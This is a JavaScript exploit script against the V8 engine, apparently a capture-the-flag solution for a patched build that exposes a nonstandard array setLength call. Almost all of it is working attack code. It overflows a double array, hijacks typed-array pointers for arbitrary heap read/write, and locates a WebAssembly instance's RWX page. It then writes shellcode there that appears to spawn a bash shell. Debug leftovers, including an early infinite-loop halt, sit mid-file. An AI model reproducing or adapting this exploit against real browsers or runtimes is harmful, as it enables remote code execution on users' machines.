///////////////////////////////////////////////////////////////////////
///////////////////         Utility Functions       ///////////////////
let hex = (val) => '0x' + val.toString(16);

function gc() {
    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
}

function print(msg) {
    // %DebugPrint(msg);
    // console.log(msg);
}

function js_heap_defragment() { // used for stable fake JSValue crafting
    gc();
    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
}

const __buf = new ArrayBuffer(8); // 8 byte array buffer
const __f64_buf = new Float64Array(__buf);
const __u32_buf = new Uint32Array(__buf);

function ftoi(val) { // typeof(val) = float
    __f64_buf[0] = val;
    return BigInt(__u32_buf[0]) + (BigInt(__u32_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    __u32_buf[0] = Number(val & 0xffffffffn);
    __u32_buf[1] = Number(val >> 32n);
    return __f64_buf[0];
}
///////////////////         Utility Functions       ///////////////////
///////////////////////////////////////////////////////////////////////
js_heap_defragment();

var buf = new ArrayBuffer(0x100);
// // allocate a doublearray and a typedarray
var arr = [1.1, 2.2, 3.3];
var arr2 = new BigInt64Array(buf);
var arr3 = new Uint32Array(buf);

// overwrite the length of the doublearray and leak js heap base
arr.setLength(100);

// use the doublearray to overwrite the typedarray's basepointer to js_heap base and length to a huge number
var data = ftoi(arr[11]);
arr[11] = itof((data & 0xffffffff00000000n));
data = ftoi(arr[9]);
arr[9] = itof((data & 0xffffffffn) + (0xfffffffn << 32n));

// leak js_base
var js_base = arr2[3] & 0xffffffff00000000n;
console.log("js_base @ " + hex(js_base))

// allocate the writer webassembly
var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 12, 3, 96, 0, 1, 126, 96, 0, 0, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 4, 3, 0, 1, 2, 7, 37, 3, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 105, 110, 99, 71, 108, 111, 98, 97, 108, 0, 1, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 2, 10, 23, 3, 4, 0, 35, 0, 11, 9, 0, 35, 0, 66, 1, 124, 36, 0, 11, 6, 0, 32, 0, 36, 0, 11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod, {js: {global}});

%DebugPrint(wasm_instance);
console.error("1");
wasm_instance.exports.incGlobal();

while(1);


// allocate the victim webassembly
var wasm_code2 = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod2 = new WebAssembly.Module(wasm_code2);
var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
var f = wasm_instance2.exports.main;

// use the doublearray to overwrite the uint32array's basepointer to js_heap and length to a huge number
// use the new uint32array to locate teh wesm_instance and leak the rwx code region
var data = ftoi(arr[20]);
arr[20] = itof((data & 0xffffffff00000000n));
data = ftoi(arr[18]);
arr[18] = itof((data & 0xffffffffn) + (0xfffffffn << 32n));
// %DebugPrint(wasm_instance2);

// search for both wasm_isntances
var sc_addr = null;
var writer_idx = null;
var writer_addr = null;
var victim_idx = null;
var victim_addr = null;
for(let i=0x081c0000/4; i<0x083c0000/4; i++) {
	// console.log(arr3[i]);
	if(arr3[i] == 0x08206439 && arr3[i+2] == 0x08002249 && arr3[i+8] == 0x0) {
		writer_idx = i;
		writer_addr = Number(js_base + BigInt(writer_idx)*4n) ;
	}
	if(arr3[i] == 0x08206439 && arr3[i+8] == 0x10000) {
		victim_idx = i;
		victim_addr = Number(js_base + BigInt(victim_idx)*4n) ;
		sc_addr = (arr3[i+25] * 0x100000000) + arr3[i+24];
	}
}
console.log("sc_addr @ " + hex(sc_addr));
console.log("writer_addr @ " + hex(writer_addr));
console.log("victim_addr @ " + hex(victim_addr));

// use the victim's import global as the buffer
// overwrite writer's global import table to the buffer
var buffer_idx = victim_idx + 0x50/4;
var buffer_addr = victim_addr + 0x50;
arr3[writer_idx + 0x50/4] = buffer_addr & 0xffffffff;
arr3[writer_idx + 0x50/4 + 1] = buffer_addr / 0x100000000;

function write4(addr, value) {
	arr3[victim_idx + 0x50/4] = addr & 0xffffffff;
	arr3[victim_idx + 0x50/4 + 1] = addr / 0x100000000;
	wasm_instance.exports.setGlobal(BigInt(value));
}
var shellcode = [0xb848686a, 0x6e69622f, 0x7361622f, 0xe7894850, 0xb848686a, 0x6e69622f, 0x7361622f, 0x56f63150, 0x485e086a, 0x4856e601, 0xd231e689, 0xf583b6a, 0x90909005];

for(let i=0; i<shellcode.length; i++) {
	write4(sc_addr+i*4, shellcode[i]);
}
console.error("1");
f()

while(1);
